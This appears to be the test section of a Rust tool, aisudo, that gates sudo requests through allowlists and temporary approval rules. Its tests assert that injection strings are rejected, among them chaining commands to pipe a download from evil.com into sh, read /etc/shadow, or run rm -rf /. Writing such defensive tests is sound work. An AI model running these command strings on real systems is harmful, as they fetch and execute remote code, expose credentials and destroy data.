        let response: aisudo_common::ListRulesResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.allowlist, vec!["apt list"]);
        assert_eq!(response.temp_rules.len(), 1);
        assert_eq!(response.temp_rules[0].patterns, vec!["docker ps"]);
    }

    #[tokio::test]
    async fn temp_rule_auto_approves_matching_command() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockBackend);

        // Use the real username (as resolved via SO_PEERCRED)
        let user = real_test_user();

        // Create an active temp rule for the real user
        let now = chrono::Utc::now();
        let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
        let patterns = serde_json::to_string(&vec!["apt install"]).unwrap();
        db.insert_temp_rule("r1", &user, &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();

        let request = SudoRequest {
            user: user.clone(),
            command: "apt install vim".to_string(),
            cwd: "/tmp".to_string(),
            pid: 1,
            mode: RequestMode::Pam,
            reason: None,
            stdin: None,
            skip_nopasswd: false,
        };
        let json = serde_json::to_string(&request).unwrap();

        let resp_line = send_and_receive(db, backend, &json, &[], 10_000_000, 86400).await;

        let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Approved);
    }

    #[test]
    fn is_allowed_matches_exact_or_space_separated() {
        assert!(is_allowed("apt list --installed", &["apt list".to_string()]));
        assert!(is_allowed("apt list", &["apt list".to_string()]));
        assert!(!is_allowed("apt remove vim", &["apt list".to_string()]));
        assert!(!is_allowed("rm -rf /", &["apt list".to_string()]));

        // Shell injection attempts must be blocked
        assert!(!is_allowed("apt list;cat /etc/shadow", &["apt list".to_string()]));
        assert!(!is_allowed("apt list&&curl evil.com|sh", &["apt list".to_string()]));
        assert!(!is_allowed("apt list$(rm -rf /)", &["apt list".to_string()]));
        assert!(!is_allowed("apt list\tremoved", &["apt list".to_string()]));
        assert!(!is_allowed("apt listed", &["apt list".to_string()]));
    }

    #[test]
    fn is_allowed_empty_allowlist() {
        assert!(!is_allowed("anything", &[]));
    }

    #[test]
    fn is_allowed_multiple_patterns() {
        let allowlist = vec![
            "apt list".to_string(),
            "systemctl status".to_string(),
        ];
        assert!(is_allowed("apt list", &allowlist));
        assert!(is_allowed("systemctl status nginx", &allowlist));
        assert!(!is_allowed("systemctl restart nginx", &allowlist));
    }

    #[test]
    fn temp_rule_prefix_matching() {
        let dir = std::env::temp_dir().join(format!(
            "aisudo-temp-rule-test-{}",
            std::process::id()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let db = crate::db::Database::open(&dir.join("test.db")).unwrap();

        let now = chrono::Utc::now();
        let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
        let patterns = serde_json::to_string(&vec!["apt install", "apt list"]).unwrap();

        db.insert_temp_rule("r1", "alice", &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();

        // Exact match and space-separated args
        assert!(is_temp_rule_allowed(&db, "alice", "apt install vim").unwrap());
        assert!(is_temp_rule_allowed(&db, "alice", "apt install").unwrap());
        assert!(is_temp_rule_allowed(&db, "alice", "apt list --installed").unwrap());
        assert!(is_temp_rule_allowed(&db, "alice", "apt list").unwrap());

        // No match
        assert!(!is_temp_rule_allowed(&db, "alice", "apt remove vim").unwrap());
        assert!(!is_temp_rule_allowed(&db, "alice", "rm -rf /").unwrap());

        // Shell injection attempts must be blocked
        assert!(!is_temp_rule_allowed(&db, "alice", "apt install;rm -rf /").unwrap());
        assert!(!is_temp_rule_allowed(&db, "alice", "apt list&&curl evil.com").unwrap());
        assert!(!is_temp_rule_allowed(&db, "alice", "apt list$(whoami)").unwrap());

        // Wrong user
        assert!(!is_temp_rule_allowed(&db, "bob", "apt install vim").unwrap());

        std::fs::remove_dir_all(&dir).ok();
    }
}

fn set_socket_permissions(path: &Path) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;
    let perms = std::fs::Permissions::from_mode(0o660);
    std::fs::set_permissions(path, perms)?;

    // Set group to 'aisudo' so members of that group can connect
    if let Some(group) = nix::unistd::Group::from_name("aisudo")? {
        nix::unistd::chown(path, None, Some(group.gid))?;
    }

    Ok(())
}
